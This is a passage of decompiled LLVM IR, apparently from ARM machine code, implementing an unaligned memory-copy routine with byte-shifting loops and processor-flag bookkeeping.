dec_label_pc_1742c:                               ; preds = %.thread12
  %v0_1742c = load i32, i32* @r1, align 4
  %v1_1742c = urem i32 %v0_1742c, 4
  store i32 %v1_1742c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1742c = icmp eq i32 %v1_1742c, 0
  %extract.t124 = trunc i32 %v0_1742c to i2
  br i1 %v2_1742c, label %dec_label_pc_17368, label %dec_label_pc_17434

dec_label_pc_17434:                               ; preds = %dec_label_pc_17360, %dec_label_pc_1742c
  %v0_1747c75 = phi i32 [ %v1_17340, %dec_label_pc_17360 ], [ %v0_1747c76, %dec_label_pc_1742c ]
  %v0_17528 = phi i32 [ %v2_17350, %dec_label_pc_17360 ], [ %v2_17424, %dec_label_pc_1742c ]
  %v0_1743c.off0 = phi i2 [ %extract.t, %dec_label_pc_17360 ], [ %extract.t124, %dec_label_pc_1742c ]
  %v0_17434 = phi i32 [ %v0_17340, %dec_label_pc_17360 ], [ %v0_1742c, %dec_label_pc_1742c ]
  %v1_17434 = and i32 %v0_17434, -4
  store i32 %v1_17434, i32* %r1.global-to-local, align 4
  %v1_17438 = inttoptr i32 %v1_17434 to i32*
  %v2_17438 = load i32, i32* %v1_17438, align 4
  store i32 %v2_17438, i32* @lr, align 4
  %v4_17438 = add i32 %v1_17434, 4
  store i32 %v4_17438, i32* %r1.global-to-local, align 4
  %v2_17520 = add i32 %v0_17528, -12
  %v4_17520 = sub i32 11, %v0_17528
  %v5_17520 = and i32 %v4_17520, %v0_17528
  %v6_17520 = icmp slt i32 %v5_17520, 0
  store i1 %v6_17520, i1* %cpsr_v.global-to-local, align 1
  %v7_17520 = icmp slt i32 %v2_17520, 0
  store i1 %v7_17520, i1* %cpsr_n.global-to-local, align 1
  %v5_17524 = icmp slt i32 %v0_17528, 12
  switch i2 %v0_1743c.off0, label %dec_label_pc_17448 [
    i2 -1, label %dec_label_pc_17520
    i2 -2, label %dec_label_pc_174b4
  ]

dec_label_pc_17448:                               ; preds = %dec_label_pc_17434
  br i1 %v5_17524, label %dec_label_pc_17494, label %dec_label_pc_17450

dec_label_pc_17450:                               ; preds = %dec_label_pc_17448
  store i32 %v2_17520, i32* %r2.global-to-local, align 4
  %v3_17454 = load i32, i32* @r4, align 4
  store i32 %v3_17454, i32* %stack_var_-16, align 4
  %v6_17454 = load i32, i32* @r5, align 4
  store i32 %v6_17454, i32* %stack_var_-12, align 4
  br label %dec_label_pc_17458

dec_label_pc_17458:                               ; preds = %dec_label_pc_17458.dec_label_pc_17458_crit_edge, %dec_label_pc_17450
  %v0_1747c = phi i32 [ %v12_1747c, %dec_label_pc_17458.dec_label_pc_17458_crit_edge ], [ %v0_1747c75, %dec_label_pc_17450 ]
  %v0_1745c = phi i32 [ %v0_1745c.pre, %dec_label_pc_17458.dec_label_pc_17458_crit_edge ], [ %v4_17438, %dec_label_pc_17450 ]
  %v0_17458 = phi i32 [ %v0_17458.pre, %dec_label_pc_17458.dec_label_pc_17458_crit_edge ], [ %v2_17438, %dec_label_pc_17450 ]
  %v3_17458 = udiv i32 %v0_17458, 256
  store i32 %v3_17458, i32* %r3.global-to-local, align 4
  %v1_1745c = inttoptr i32 %v0_1745c to i32*
  %v2_1745c = load i32, i32* %v1_1745c, align 4
  store i32 %v2_1745c, i32* %r4.global-to-local, align 4
  %v3_1745c = add i32 %v0_1745c, 4
  %v4_1745c = inttoptr i32 %v3_1745c to i32*
  %v5_1745c = load i32, i32* %v4_1745c, align 4
  store i32 %v5_1745c, i32* %r5.global-to-local, align 4
  %v6_1745c = add i32 %v0_1745c, 8
  %v7_1745c = inttoptr i32 %v6_1745c to i32*
  %v8_1745c = load i32, i32* %v7_1745c, align 4
  store i32 %v8_1745c, i32* %ip.global-to-local, align 4
  %v9_1745c = add i32 %v0_1745c, 12
  %v10_1745c = inttoptr i32 %v9_1745c to i32*
  %v11_1745c = load i32, i32* %v10_1745c, align 4
  store i32 %v11_1745c, i32* @lr, align 4
  %v12_1745c = add i32 %v0_1745c, 16
  store i32 %v12_1745c, i32* %r1.global-to-local, align 4
  %v4_17460 = mul i32 %v2_1745c, 16777216
  %v5_17460 = or i32 %v4_17460, %v3_17458
  store i32 %v5_17460, i32* %r3.global-to-local, align 4
  %v3_17464 = udiv i32 %v2_1745c, 256
  %v4_17468 = mul i32 %v5_1745c, 16777216
  %v5_17468 = or i32 %v4_17468, %v3_17464
  store i32 %v5_17468, i32* %r4.global-to-local, align 4
  %v3_1746c = udiv i32 %v5_1745c, 256
  %v4_17470 = mul i32 %v8_1745c, 16777216
  %v5_17470 = or i32 %v4_17470, %v3_1746c
  store i32 %v5_17470, i32* %r5.global-to-local, align 4
  %v3_17474 = udiv i32 %v8_1745c, 256
  %v4_17478 = mul i32 %v11_1745c, 16777216
  %v5_17478 = or i32 %v4_17478, %v3_17474
  store i32 %v5_17478, i32* @ip, align 4
  %v1_1747c = inttoptr i32 %v0_1747c to i32*
  store i32 %v5_17460, i32* %v1_1747c, align 4
  %v3_1747c = add i32 %v0_1747c, 4
  %v4_1747c = inttoptr i32 %v3_1747c to i32*
  %v5_1747c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1747c, i32* %v4_1747c, align 4
  %v6_1747c = add i32 %v0_1747c, 8
  %v7_1747c = inttoptr i32 %v6_1747c to i32*
  %v8_1747c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1747c, i32* %v7_1747c, align 4
  %v9_1747c = add i32 %v0_1747c, 12
  %v10_1747c = inttoptr i32 %v9_1747c to i32*
  %v11_1747c = load i32, i32* @ip, align 4
  store i32 %v11_1747c, i32* %v10_1747c, align 4
  %v12_1747c = add i32 %v0_1747c, 16
  store i32 %v12_1747c, i32* %r0.global-to-local, align 4
  %v0_17480 = load i32, i32* %r2.global-to-local, align 4
  %v2_17480 = add i32 %v0_17480, -16
  store i32 %v2_17480, i32* %r2.global-to-local, align 4
  %v6_17484 = icmp slt i32 %v0_17480, 16
  br i1 %v6_17484, label %dec_label_pc_17488, label %dec_label_pc_17458.dec_label_pc_17458_crit_edge

dec_label_pc_17458.dec_label_pc_17458_crit_edge:  ; preds = %dec_label_pc_17458
  %v0_17458.pre = load i32, i32* @lr, align 4
  %v0_1745c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17458

dec_label_pc_17488:                               ; preds = %dec_label_pc_17458
  %v2_17488 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17488, i32* @r4, align 4
  %v5_17488 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_17488, i32* @r5, align 4
  %v2_1748c = add i32 %v0_17480, -4
  store i32 %v2_1748c, i32* %r2.global-to-local, align 4
  %v4_1748c = add i32 %v0_17480, 2147483632
  %v5_1748c = and i32 %v2_1748c, %v4_1748c
  %v6_1748c = icmp slt i32 %v5_1748c, 0
  store i1 %v6_1748c, i1* %cpsr_v.global-to-local, align 1
  %v7_1748c = icmp slt i32 %v2_1748c, 0
  store i1 %v7_1748c, i1* %cpsr_n.global-to-local, align 1
  %v5_17490 = icmp slt i32 %v2_17480, -12
  br i1 %v5_17490, label %dec_label_pc_174ac, label %dec_label_pc_17494

dec_label_pc_17494:                               ; preds = %dec_label_pc_17488, %dec_label_pc_17448, %dec_label_pc_17494
  %v1_174a0 = phi i32 [ %v4_174a0, %dec_label_pc_17494 ], [ %v12_1747c, %dec_label_pc_17488 ], [ %v0_1747c75, %dec_label_pc_17448 ]
  %v0_17494 = load i32, i32* @lr, align 4
  %v3_17494 = udiv i32 %v0_17494, 256
  store i32 %v3_17494, i32* %ip.global-to-local, align 4
  %v0_17498 = load i32, i32* %r1.global-to-local, align 4
  %v1_17498 = inttoptr i32 %v0_17498 to i32*
  %v2_17498 = load i32, i32* %v1_17498, align 4
  store i32 %v2_17498, i32* @lr, align 4
  %v4_17498 = add i32 %v0_17498, 4
  store i32 %v4_17498, i32* %r1.global-to-local, align 4
  %v4_1749c = mul i32 %v2_17498, 16777216
  %v5_1749c = or i32 %v4_1749c, %v3_17494
  store i32 %v5_1749c, i32* @ip, align 4
  %v2_174a0 = inttoptr i32 %v1_174a0 to i32*
  store i32 %v5_1749c, i32* %v2_174a0, align 4
  %v3_174a0 = load i32, i32* %r0.global-to-local, align 4
  %v4_174a0 = add i32 %v3_174a0, 4
  store i32 %v4_174a0, i32* %r0.global-to-local, align 4
  %v0_174a4 = load i32, i32* %r2.global-to-local, align 4
  %v2_174a4 = add i32 %v0_174a4, -4
  store i32 %v2_174a4, i32* %r2.global-to-local, align 4
  %v6_174a8 = icmp slt i32 %v0_174a4, 4
  br i1 %v6_174a8, label %dec_label_pc_174ac.loopexit, label %dec_label_pc_17494

dec_label_pc_174ac.loopexit:                      ; preds = %dec_label_pc_17494
  %v4_174a4 = sub i32 3, %v0_174a4
  %v5_174a4 = and i32 %v4_174a4, %v0_174a4
  %v6_174a4 = icmp slt i32 %v5_174a4, 0
  %v7_174a4 = icmp slt i32 %v2_174a4, 0
  store i1 %v6_174a4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_174a4, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_174ac

dec_label_pc_174ac:                               ; preds = %dec_label_pc_174ac.loopexit, %dec_label_pc_17488
  %v2_173ec113 = phi i32 [ %v4_174a0, %dec_label_pc_174ac.loopexit ], [ %v12_1747c, %dec_label_pc_17488 ]
  %v0_173dc109 = phi i32 [ %v2_174a4, %dec_label_pc_174ac.loopexit ], [ %v2_1748c, %dec_label_pc_17488 ]
  %v0_174ac = load i32, i32* %r1.global-to-local, align 4
  %v1_174ac = add i32 %v0_174ac, -3
  store i32 %v1_174ac, i32* @r1, align 4
  br label %bb133

dec_label_pc_174b4:                               ; preds = %dec_label_pc_17434
  br i1 %v5_17524, label %dec_label_pc_17500, label %dec_label_pc_174bc

dec_label_pc_174bc:                               ; preds = %dec_label_pc_174b4
  store i32 %v2_17520, i32* %r2.global-to-local, align 4
  %v3_174c0 = load i32, i32* @r4, align 4
  store i32 %v3_174c0, i32* %stack_var_-16, align 4
  %v6_174c0 = load i32, i32* @r5, align 4
  store i32 %v6_174c0, i32* %stack_var_-12, align 4
  br label %dec_label_pc_174c4

dec_label_pc_174c4:                               ; preds = %dec_label_pc_174c4.dec_label_pc_174c4_crit_edge, %dec_label_pc_174bc
  %v0_174e8 = phi i32 [ %v12_174e8, %dec_label_pc_174c4.dec_label_pc_174c4_crit_edge ], [ %v0_1747c75, %dec_label_pc_174bc ]
  %v0_174c8 = phi i32 [ %v0_174c8.pre, %dec_label_pc_174c4.dec_label_pc_174c4_crit_edge ], [ %v4_17438, %dec_label_pc_174bc ]
  %v0_174c4 = phi i32 [ %v0_174c4.pre, %dec_label_pc_174c4.dec_label_pc_174c4_crit_edge ], [ %v2_17438, %dec_label_pc_174bc ]
  %v3_174c4 = udiv i32 %v0_174c4, 65536
  store i32 %v3_174c4, i32* %r3.global-to-local, align 4
  %v1_174c8 = inttoptr i32 %v0_174c8 to i32*
  %v2_174c8 = load i32, i32* %v1_174c8, align 4
  store i32 %v2_174c8, i32* %r4.global-to-local, align 4
  %v3_174c8 = add i32 %v0_174c8, 4
  %v4_174c8 = inttoptr i32 %v3_174c8 to i32*
  %v5_174c8 = load i32, i32* %v4_174c8, align 4
  store i32 %v5_174c8, i32* %r5.global-to-local, align 4
  %v6_174c8 = add i32 %v0_174c8, 8
  %v7_174c8 = inttoptr i32 %v6_174c8 to i32*
  %v8_174c8 = load i32, i32* %v7_174c8, align 4
  store i32 %v8_174c8, i32* %ip.global-to-local, align 4
  %v9_174c8 = add i32 %v0_174c8, 12
  %v10_174c8 = inttoptr i32 %v9_174c8 to i32*
  %v11_174c8 = load i32, i32* %v10_174c8, align 4
  store i32 %v11_174c8, i32* @lr, align 4
  %v12_174c8 = add i32 %v0_174c8, 16
  store i32 %v12_174c8, i32* %r1.global-to-local, align 4
  %v4_174cc = mul i32 %v2_174c8, 65536
  %v5_174cc = or i32 %v4_174cc, %v3_174c4
  store i32 %v5_174cc, i32* %r3.global-to-local, align 4
  %v3_174d0 = udiv i32 %v2_174c8, 65536
  %v4_174d4 = mul i32 %v5_174c8, 65536
  %v5_174d4 = or i32 %v4_174d4, %v3_174d0
  store i32 %v5_174d4, i32* %r4.global-to-local, align 4
  %v3_174d8 = udiv i32 %v5_174c8, 65536
  %v4_174dc = mul i32 %v8_174c8, 65536
  %v5_174dc = or i32 %v4_174dc, %v3_174d8
  store i32 %v5_174dc, i32* %r5.global-to-local, align 4
  %v3_174e0 = udiv i32 %v8_174c8, 65536
  %v4_174e4 = mul i32 %v11_174c8, 65536
  %v5_174e4 = or i32 %v4_174e4, %v3_174e0
  store i32 %v5_174e4, i32* @ip, align 4
  %v1_174e8 = inttoptr i32 %v0_174e8 to i32*
  store i32 %v5_174cc, i32* %v1_174e8, align 4
  %v3_174e8 = add i32 %v0_174e8, 4
  %v4_174e8 = inttoptr i32 %v3_174e8 to i32*
  %v5_174e8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_174e8, i32* %v4_174e8, align 4
  %v6_174e8 = add i32 %v0_174e8, 8
  %v7_174e8 = inttoptr i32 %v6_174e8 to i32*
  %v8_174e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_174e8, i32* %v7_174e8, align 4
  %v9_174e8 = add i32 %v0_174e8, 12
  %v10_174e8 = inttoptr i32 %v9_174e8 to i32*
  %v11_174e8 = load i32, i32* @ip, align 4
  store i32 %v11_174e8, i32* %v10_174e8, align 4
  %v12_174e8 = add i32 %v0_174e8, 16
  store i32 %v12_174e8, i32* %r0.global-to-local, align 4
  %v0_174ec = load i32, i32* %r2.global-to-local, align 4
  %v2_174ec = add i32 %v0_174ec, -16
  store i32 %v2_174ec, i32* %r2.global-to-local, align 4
  %v6_174f0 = icmp slt i32 %v0_174ec, 16
  br i1 %v6_174f0, label %dec_label_pc_174f4, label %dec_label_pc_174c4.dec_label_pc_174c4_crit_edge

dec_label_pc_174c4.dec_label_pc_174c4_crit_edge:  ; preds = %dec_label_pc_174c4
  %v0_174c4.pre = load i32, i32* @lr, align 4
  %v0_174c8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_174c4

dec_label_pc_174f4:                               ; preds = %dec_label_pc_174c4
  %v2_174f4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_174f4, i32* @r4, align 4
  %v5_174f4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_174f4, i32* @r5, align 4
  %v2_174f8 = add i32 %v0_174ec, -4
  store i32 %v2_174f8, i32* %r2.global-to-local, align 4
  %v4_174f8 = add i32 %v0_174ec, 2147483632
  %v5_174f8 = and i32 %v2_174f8, %v4_174f8
  %v6_174f8 = icmp slt i32 %v5_174f8, 0
  store i1 %v6_174f8, i1* %cpsr_v.global-to-local, align 1
  %v7_174f8 = icmp slt i32 %v2_174f8, 0
  store i1 %v7_174f8, i1* %cpsr_n.global-to-local, align 1
  %v5_174fc = icmp slt i32 %v2_174ec, -12
  br i1 %v5_174fc, label %dec_label_pc_17518, label %dec_label_pc_17500

dec_label_pc_17500:                               ; preds = %dec_label_pc_174f4, %dec_label_pc_174b4, %dec_label_pc_17500
  %v1_1750c = phi i32 [ %v4_1750c, %dec_label_pc_17500 ], [ %v12_174e8, %dec_label_pc_174f4 ], [ %v0_1747c75, %dec_label_pc_174b4 ]
  %v0_17500 = load i32, i32* @lr, align 4
  %v3_17500 = udiv i32 %v0_17500, 65536
  store i32 %v3_17500, i32* %ip.global-to-local, align 4
  %v0_17504 = load i32, i32* %r1.global-to-local, align 4
  %v1_17504 = inttoptr i32 %v0_17504 to i32*
  %v2_17504 = load i32, i32* %v1_17504, align 4
  store i32 %v2_17504, i32* @lr, align 4
  %v4_17504 = add i32 %v0_17504, 4
  store i32 %v4_17504, i32* %r1.global-to-local, align 4
  %v4_17508 = mul i32 %v2_17504, 65536
  %v5_17508 = or i32 %v4_17508, %v3_17500
  store i32 %v5_17508, i32* @ip, align 4
  %v2_1750c = inttoptr i32 %v1_1750c to i32*
  store i32 %v5_17508, i32* %v2_1750c, align 4
  %v3_1750c = load i32, i32* %r0.global-to-local, align 4
  %v4_1750c = add i32 %v3_1750c, 4
  store i32 %v4_1750c, i32* %r0.global-to-local, align 4
  %v0_17510 = load i32, i32* %r2.global-to-local, align 4
  %v2_17510 = add i32 %v0_17510, -4
  store i32 %v2_17510, i32* %r2.global-to-local, align 4
  %v6_17514 = icmp slt i32 %v0_17510, 4
  br i1 %v6_17514, label %dec_label_pc_17518.loopexit, label %dec_label_pc_17500

dec_label_pc_17518.loopexit:                      ; preds = %dec_label_pc_17500
  %v4_17510 = sub i32 3, %v0_17510
  %v5_17510 = and i32 %v4_17510, %v0_17510
  %v6_17510 = icmp slt i32 %v5_17510, 0
  %v7_17510 = icmp slt i32 %v2_17510, 0
  store i1 %v6_17510, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17510, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_17518

dec_label_pc_17518:                               ; preds = %dec_label_pc_17518.loopexit, %dec_label_pc_174f4
  %v2_173ec112 = phi i32 [ %v4_1750c, %dec_label_pc_17518.loopexit ], [ %v12_174e8, %dec_label_pc_174f4 ]
  %v0_173dc108 = phi i32 [ %v2_17510, %dec_label_pc_17518.loopexit ], [ %v2_174f8, %dec_label_pc_174f4 ]
  %v0_17518 = load i32, i32* %r1.global-to-local, align 4
  %v1_17518 = add i32 %v0_17518, -2
  store i32 %v1_17518, i32* @r1, align 4
  br label %bb133

dec_label_pc_17520:                               ; preds = %dec_label_pc_17434
  br i1 %v5_17524, label %dec_label_pc_1756c, label %dec_label_pc_17528

dec_label_pc_17528:                               ; preds = %dec_label_pc_17520
  store i32 %v2_17520, i32* %r2.global-to-local, align 4
  %v3_1752c = load i32, i32* @r4, align 4
  store i32 %v3_1752c, i32* %stack_var_-16, align 4
  %v6_1752c = load i32, i32* @r5, align 4
  store i32 %v6_1752c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_17530

dec_label_pc_17530:                               ; preds = %dec_label_pc_17530.dec_label_pc_17530_crit_edge, %dec_label_pc_17528
  %v0_17554 = phi i32 [ %v12_17554, %dec_label_pc_17530.dec_label_pc_17530_crit_edge ], [ %v0_1747c75, %dec_label_pc_17528 ]
  %v0_17534 = phi i32 [ %v0_17534.pre, %dec_label_pc_17530.dec_label_pc_17530_crit_edge ], [ %v4_17438, %dec_label_pc_17528 ]
  %v0_17530 = phi i32 [ %v0_17530.pre, %dec_label_pc_17530.dec_label_pc_17530_crit_edge ], [ %v2_17438, %dec_label_pc_17528 ]
  %v3_17530 = udiv i32 %v0_17530, 16777216
  store i32 %v3_17530, i32* %r3.global-to-local, align 4
  %v1_17534 = inttoptr i32 %v0_17534 to i32*
  %v2_17534 = load i32, i32* %v1_17534, align 4
  store i32 %v2_17534, i32* %r4.global-to-local, align 4
  %v3_17534 = add i32 %v0_17534, 4
  %v4_17534 = inttoptr i32 %v3_17534 to i32*
  %v5_17534 = load i32, i32* %v4_17534, align 4
  store i32 %v5_17534, i32* %r5.global-to-local, align 4
  %v6_17534 = add i32 %v0_17534, 8
  %v7_17534 = inttoptr i32 %v6_17534 to i32*
  %v8_17534 = load i32, i32* %v7_17534, align 4
  store i32 %v8_17534, i32* %ip.global-to-local, align 4
  %v9_17534 = add i32 %v0_17534, 12
  %v10_17534 = inttoptr i32 %v9_17534 to i32*
  %v11_17534 = load i32, i32* %v10_17534, align 4
  store i32 %v11_17534, i32* @lr, align 4
  %v12_17534 = add i32 %v0_17534, 16
  store i32 %v12_17534, i32* %r1.global-to-local, align 4
  %v4_17538 = mul i32 %v2_17534, 256
  %v5_17538 = or i32 %v4_17538, %v3_17530
  store i32 %v5_17538, i32* %r3.global-to-local, align 4
  %v3_1753c = udiv i32 %v2_17534, 16777216
  %v4_17540 = mul i32 %v5_17534, 256
  %v5_17540 = or i32 %v4_17540, %v3_1753c
  store i32 %v5_17540, i32* %r4.global-to-local, align 4
  %v3_17544 = udiv i32 %v5_17534, 16777216
  %v4_17548 = mul i32 %v8_17534, 256
  %v5_17548 = or i32 %v4_17548, %v3_17544
  store i32 %v5_17548, i32* %r5.global-to-local, align 4
  %v3_1754c = udiv i32 %v8_17534, 16777216
  %v4_17550 = mul i32 %v11_17534, 256
  %v5_17550 = or i32 %v4_17550, %v3_1754c
  store i32 %v5_17550, i32* @ip, align 4
  %v1_17554 = inttoptr i32 %v0_17554 to i32*
  store i32 %v5_17538, i32* %v1_17554, align 4
  %v3_17554 = add i32 %v0_17554, 4
  %v4_17554 = inttoptr i32 %v3_17554 to i32*
  %v5_17554 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17554, i32* %v4_17554, align 4
  %v6_17554 = add i32 %v0_17554, 8
  %v7_17554 = inttoptr i32 %v6_17554 to i32*
  %v8_17554 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_17554, i32* %v7_17554, align 4
  %v9_17554 = add i32 %v0_17554, 12
  %v10_17554 = inttoptr i32 %v9_17554 to i32*
  %v11_17554 = load i32, i32* @ip, align 4
  store i32 %v11_17554, i32* %v10_17554, align 4
  %v12_17554 = add i32 %v0_17554, 16
  store i32 %v12_17554, i32* %r0.global-to-local, align 4
  %v0_17558 = load i32, i32* %r2.global-to-local, align 4
  %v2_17558 = add i32 %v0_17558, -16
  store i32 %v2_17558, i32* %r2.global-to-local, align 4
  %v6_1755c = icmp slt i32 %v0_17558, 16
  br i1 %v6_1755c, label %dec_label_pc_17560, label %dec_label_pc_17530.dec_label_pc_17530_crit_edge

dec_label_pc_17530.dec_label_pc_17530_crit_edge:  ; preds = %dec_label_pc_17530
  %v0_17530.pre = load i32, i32* @lr, align 4
  %v0_17534.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17530

dec_label_pc_17560:                               ; preds = %dec_label_pc_17530
  %v2_17560 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17560, i32* @r4, align 4
  %v5_17560 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_17560, i32* @r5, align 4
  %v2_17564 = add i32 %v0_17558, -4
  store i32 %v2_17564, i32* %r2.global-to-local, align 4
  %v4_17564 = add i32 %v0_17558, 2147483632
  %v5_17564 = and i32 %v2_17564, %v4_17564
  %v6_17564 = icmp slt i32 %v5_17564, 0
  store i1 %v6_17564, i1* %cpsr_v.global-to-local, align 1
  %v7_17564 = icmp slt i32 %v2_17564, 0
  store i1 %v7_17564, i1* %cpsr_n.global-to-local, align 1
  %v5_17568 = icmp slt i32 %v2_17558, -12
  br i1 %v5_17568, label %dec_label_pc_17584, label %dec_label_pc_1756c

dec_label_pc_1756c:                               ; preds = %dec_label_pc_17560, %dec_label_pc_17520, %dec_label_pc_1756c
  %v1_17578 = phi i32 [ %v4_17578, %dec_label_pc_1756c ], [ %v12_17554, %dec_label_pc_17560 ], [ %v0_1747c75, %dec_label_pc_17520 ]
  %v0_1756c = load i32, i32* @lr, align 4
  %v3_1756c = udiv i32 %v0_1756c, 16777216
  store i32 %v3_1756c, i32* %ip.global-to-local, align 4
  %v0_17570 = load i32, i32* %r1.global-to-local, align 4
  %v1_17570 = inttoptr i32 %v0_17570 to i32*
  %v2_17570 = load i32, i32* %v1_17570, align 4
  store i32 %v2_17570, i32* @lr, align 4
  %v4_17570 = add i32 %v0_17570, 4
  store i32 %v4_17570, i32* %r1.global-to-local, align 4
  %v4_17574 = mul i32 %v2_17570, 256
  %v5_17574 = or i32 %v4_17574, %v3_1756c
  store i32 %v5_17574, i32* @ip, align 4
  %v2_17578 = inttoptr i32 %v1_17578 to i32*
  store i32 %v5_17574, i32* %v2_17578, align 4
  %v3_17578 = load i32, i32* %r0.global-to-local, align 4
  %v4_17578 = add i32 %v3_17578, 4
  store i32 %v4_17578, i32* %r0.global-to-local, align 4
  %v0_1757c = load i32, i32* %r2.global-to-local, align 4
  %v2_1757c = add i32 %v0_1757c, -4
  store i32 %v2_1757c, i32* %r2.global-to-local, align 4
  %v6_17580 = icmp slt i32 %v0_1757c, 4
  br i1 %v6_17580, label %dec_label_pc_17584.loopexit, label %dec_label_pc_1756c

dec_label_pc_17584.loopexit:                      ; preds = %dec_label_pc_1756c
  %v4_1757c = sub i32 3, %v0_1757c
  %v5_1757c = and i32 %v4_1757c, %v0_1757c
  %v6_1757c = icmp slt i32 %v5_1757c, 0
  %v7_1757c = icmp slt i32 %v2_1757c, 0
  store i1 %v6_1757c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1757c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_17584

dec_label_pc_17584:                               ; preds = %dec_label_pc_17584.loopexit, %dec_label_pc_17560
  %v2_173ec114 = phi i32 [ %v4_17578, %dec_label_pc_17584.loopexit ], [ %v12_17554, %dec_label_pc_17560 ]
  %v0_173dc110 = phi i32 [ %v2_1757c, %dec_label_pc_17584.loopexit ], [ %v2_17564, %dec_label_pc_17560 ]
  %v0_17584 = load i32, i32* %r1.global-to-local, align 4
  %v1_17584 = add i32 %v0_17584, -1
  store i32 %v1_17584, i32* @r1, align 4
  br label %bb133

dec_label_pc_1758c:                               ; preds = %entry
  %v1_1758c = load i32, i32* @r2, align 4
  %v2_1758c = add i32 %v1_1758c, %v0_17340
  store i32 %v2_1758c, i32* @r1, align 4
  %v2_17590 = add i32 %v1_1758c, %v1_17340
  store i32 %v2_17590, i32* %r0.global-to-local, align 4
  %v2_17594 = add i32 %v1_1758c, -4
  store i32 %v2_17594, i32* %r2.global-to-local, align 4
  %v4_17594 = sub i32 3, %v1_1758c
  %v5_17594 = and i32 %v4_17594, %v1_1758c
  %v6_17594 = icmp slt i32 %v5_17594, 0
  store i1 %v6_17594, i1* %cpsr_v.global-to-local, align 1
  %v7_17594 = icmp slt i32 %v2_17594, 0
  store i1 %v7_17594, i1* %cpsr_n.global-to-local, align 1
  %v5_17598 = icmp slt i32 %v1_1758c, 4
  br i1 %v5_17598, label %bb143, label %dec_label_pc_1759c

dec_label_pc_1759c:                               ; preds = %dec_label_pc_1758c
  %v1_1759c = urem i32 %v2_17590, 4
  store i32 %v1_1759c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1759c = icmp eq i32 %v1_1759c, 0
  br i1 %v2_1759c, label %dec_label_pc_175a4, label %dec_label_pc_17644

dec_label_pc_175a4:                               ; preds = %dec_label_pc_1759c
  %v1_175a4 = urem i32 %v2_1758c, 4
  store i32 %v1_175a4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_175a4 = icmp eq i32 %v1_175a4, 0
  br i1 %v2_175a4, label %dec_label_pc_175ac, label %dec_label_pc_17670

dec_label_pc_175ac:                               ; preds = %dec_label_pc_175a4, %dec_label_pc_17668
  %v0_175c449 = phi i32 [ %v2_17590, %dec_label_pc_175a4 ], [ %v0_176b832, %dec_label_pc_17668 ]
  %v0_175c048 = phi i32 [ %v2_1758c, %dec_label_pc_175a4 ], [ %v0_17668, %dec_label_pc_17668 ]
  %v0_175ac = phi i32 [ %v2_17594, %dec_label_pc_175a4 ], [ %v2_17660, %dec_label_pc_17668 ]
  %v2_175ac = add i32 %v0_175ac, -8
  store i32 %v2_175ac, i32* %r2.global-to-local, align 4
  %v4_175ac = sub i32 7, %v0_175ac
  %v5_175ac = and i32 %v4_175ac, %v0_175ac
  %v6_175ac = icmp slt i32 %v5_175ac, 0
  store i1 %v6_175ac, i1* %cpsr_v.global-to-local, align 1
  %v7_175ac = icmp slt i32 %v2_175ac, 0
  store i1 %v7_175ac, i1* %cpsr_n.global-to-local, align 1
  %v5_175b0 = icmp slt i32 %v0_175ac, 8
  br i1 %v5_175b0, label %dec_label_pc_175fc, label %dec_label_pc_175b4

dec_label_pc_175b4:                               ; preds = %dec_label_pc_175ac
  %v3_175b4 = load i32, i32* @r4, align 4
  %v5_175b4 = inttoptr i32 %v3_175b4 to i8*
  store i8* %v5_175b4, i8** %stack_var_-8, align 4
  %v8_175b4 = load i32, i32* @lr, align 4
  %v2_175b8 = add i32 %v0_175ac, -28
  store i32 %v2_175b8, i32* %r2.global-to-local, align 4
  %v4_175b8 = sub i32 27, %v0_175ac
  %v5_175b8 = and i32 %v4_175b8, %v2_175ac
  %v6_175b8 = icmp slt i32 %v5_175b8, 0
  store i1 %v6_175b8, i1* %cpsr_v.global-to-local, align 1
  %v7_175b8 = icmp slt i32 %v2_175b8, 0
  store i1 %v7_175b8, i1* %cpsr_n.global-to-local, align 1
  %v5_175bc = icmp slt i32 %v2_175ac, 20
  br i1 %v5_175bc, label %dec_label_pc_175d8, label %dec_label_pc_175c0

dec_label_pc_175c0:                               ; preds = %dec_label_pc_175b4, %dec_label_pc_175c0.dec_label_pc_175c0_crit_edge
  %v0_175c4 = phi i32 [ %v1_175cc, %dec_label_pc_175c0.dec_label_pc_175c0_crit_edge ], [ %v0_175c449, %dec_label_pc_175b4 ]
  %v0_175c0 = phi i32 [ %v0_175c0.pre, %dec_label_pc_175c0.dec_label_pc_175c0_crit_edge ], [ %v0_175c048, %dec_label_pc_175b4 ]
  %v1_175c0 = add i32 %v0_175c0, -4
  %v2_175c0 = inttoptr i32 %v1_175c0 to i32*
  %v3_175c0 = load i32, i32* %v2_175c0, align 4
  store i32 %v3_175c0, i32* %r3.global-to-local, align 4
  %v4_175c0 = add i32 %v0_175c0, -8
  %v5_175c0 = inttoptr i32 %v4_175c0 to i32*
  %v6_175c0 = load i32, i32* %v5_175c0, align 4
  store i32 %v6_175c0, i32* %r4.global-to-local, align 4
  %v7_175c0 = add i32 %v0_175c0, -12
  %v8_175c0 = inttoptr i32 %v7_175c0 to i32*
